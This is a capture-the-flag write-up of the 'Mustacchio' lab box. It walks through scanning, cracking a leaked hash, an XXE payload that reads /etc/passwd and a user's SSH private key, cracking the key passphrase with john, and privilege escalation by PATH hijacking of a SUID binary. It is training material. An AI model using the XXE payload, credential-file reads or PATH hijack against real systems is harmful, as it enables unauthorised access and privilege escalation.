# CTF Writeup: Mustacchio

---

- Step 1: made nmap -Pn -p- -T5 target_ ip --> 22, 80 & 8765 open
- Step 2: enumerated hidden dir's within webpage --> found  /custom --> users.bak file --> downloaded it
- Step 3: made strings users.bak --> gained creds admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
- Step 4: went to crackstation and decoded the hash value --> password: bulldog19
- Step 5: logged into webpage --> command field --> analyzed source code and it prompts me to
type in xml code --> xxe exploit
- Step 6: created this XML template which creates a variable named ent which displays /etc/passwd:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd">]>
<comment>
<name>&ent;</name>
<author>Barry Clad</author>
<com>test</com>
</comment>
- Step 7: after that I displayed id_rsa key from user barry, since I found a hint on the webpage source
about the user Barry --> /home/barry/.ssh/id_rsa --> retrieved private key from barry
- Step 8: added it locally to id_rsa7 and made chmod 600 --> logged into ssh with ssh -i id_rsa7 barry@target_ip
- Step 9: didn't worrk -->< intercepted traffic into proxy burp --> displayed the private key in a better format
copy pasted it into .txt file
- Step 10: made --> python2 /home/unkn0wn/Desktop/Tools/ssh2john.py id_rsa7 > crack.txt
- Step 11: cracking hashes --> made john crack.txt --wordlist=/usr/share/wordlists/rockyou.txt 
and retrieved passphrase: urieljames
- Step 12: made ssh -i id_rsa7 barry@target_ip --> gained ssh
- Step 13: retrieved user flag.
- Step 14: made sudo -l --> doesnt work --> checked for SUID binaries --> made find / -perm /4000 2>/dev/null
- Step 15: /home/joe/live_log looks interesting --> made strings live_log to check out payload.
- Step 16: found "tail -f /var/log/nginx/access.log" tail is an linux cli tool which 
always checks out the last line of an file. Since it has no absolute path only an relative path, we can
modify the tail binary. 
- Step 17: went into /home/barry and made nano tail --> added shebang statement + sudo /bin/bash 
- Step 18: made export PATH=/home/barry:$PATH so tail gets executed first --> checks for tail always in
/home/barry first --> not takes the tail input from other directories first so our script gets executed
and not overwritten.
- Step 19: made ./live_log and got root 
- Step 20: retrieved root flag.

---

## Key Learnings

- Added New Tool ssh2john to my arsenal
- Further strenghtened hash cracking knowledge
- further improved general linux knowledge --> PATH variable & tail tool
- Learned about XML/XXE exploits 
- Further strengthened enumeration methodology
- Further strengthened knowledge about id_rsa keys
